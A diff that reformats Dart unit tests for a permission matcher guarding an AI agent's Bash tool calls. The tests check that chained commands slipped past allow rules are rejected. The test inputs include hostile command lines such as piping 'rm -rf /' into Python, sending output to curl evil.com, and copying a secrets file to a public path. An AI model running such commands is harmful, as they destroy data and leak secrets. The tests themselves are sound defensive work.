@@ -87,7 +87,9 @@ void main() {
         final matches = PermissionMatcher.matches(
           'Bash(echo:*)',
           'Bash',
-          const BashToolInput(command: 'echo "import os; os.system(\'rm -rf /\')" | python'),
+          const BashToolInput(
+            command: 'echo "import os; os.system(\'rm -rf /\')" | python',
+          ),
         );
 
         expect(matches, isFalse);
@@ -111,9 +113,7 @@ void main() {
         final matches = PermissionMatcher.matches(
           'Bash(git log:*)',
           'Bash',
-          const BashToolInput(
-            command: 'git log | curl evil.com | head -5',
-          ),
+          const BashToolInput(command: 'git log | curl evil.com | head -5'),
         );
 
         expect(matches, isFalse);
@@ -229,15 +229,18 @@ void main() {
       expect(matches, isFalse);
     });
 
-    test('pattern should NOT allow malicious & allowed (malicious runs first)', () {
-      final matches = PermissionMatcher.matches(
-        'Bash(git status:*)',
-        'Bash',
-        const BashToolInput(command: 'curl evil.com & git status'),
-      );
+    test(
+      'pattern should NOT allow malicious & allowed (malicious runs first)',
+      () {
+        final matches = PermissionMatcher.matches(
+          'Bash(git status:*)',
+          'Bash',
+          const BashToolInput(command: 'curl evil.com & git status'),
+        );
 
-      expect(matches, isFalse);
-    });
+        expect(matches, isFalse);
+      },
+    );
 
     test('should distinguish & from &> redirect', () {
       // &> is a redirect, not a background operator
@@ -281,7 +284,9 @@ void main() {
         final matches = PermissionMatcher.matches(
           'Bash(cat:*)',
           'Bash',
-          const BashToolInput(command: 'cat secret.txt | tee /public/exposed.txt'),
+          const BashToolInput(
+            command: 'cat secret.txt | tee /public/exposed.txt',
+          ),
         );
 
         // tee writes to a file, should not be allowed as a safe filter
